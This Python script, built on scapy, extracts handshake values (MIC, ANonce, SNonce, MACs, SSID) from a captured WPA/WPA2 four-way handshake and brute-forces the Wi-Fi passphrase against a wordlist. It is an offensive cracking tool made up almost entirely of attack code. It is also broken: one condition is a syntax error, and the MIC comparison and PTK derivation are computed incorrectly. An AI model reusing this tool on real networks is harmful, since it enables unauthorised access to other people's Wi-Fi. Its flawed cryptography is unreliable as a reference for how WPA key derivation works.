import sys
from scapy.all import *
import hashlib
import hmac

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            if mic, snonce, sta_mac, bssid, anonce:
                break

        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")
    
    return mic, snonce, sta_mac, bssid, anonce, ssid

def calculate_pmk(passphrase, ssid):
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    return pmk

def calculate_ptk(pmk, snonce, anonce, sta_mac, bssid):
    a = b"Pairwise key expansion"
    b = min(sta_mac, bssid) + max(sta_mac, bssid) + min(snonce, anonce) + max(snonce, anonce)
    ptk = hmac.new(pmk, a+b, hashlib.sha1).digest()[:16]
    return ptk

def main(input_file, wordlist_file):
    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(input_file)
    
    with open(wordlist_file, 'r') as wordlist:
        for passphrase in wordlist:
            passphrase = passphrase.strip()
            pmk = calculate_pmk(passphrase, ssid)
            ptk = calculate_ptk(pmk, snonce, anonce, sta_mac, bssid)
            
            calculated_mic = hmac.new(ptk, mic, hashlib.sha1).digest()

            if calculated_mic == mic:
                print(f"Found PSK: {passphrase}")
                break

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python extract.py <input_file.cap/pcap> <wordlist.txt>")
        sys.exit(1)

    input_file = sys.argv[1]
    wordlist_file = sys.argv[2]
    main(input_file, wordlist_file)
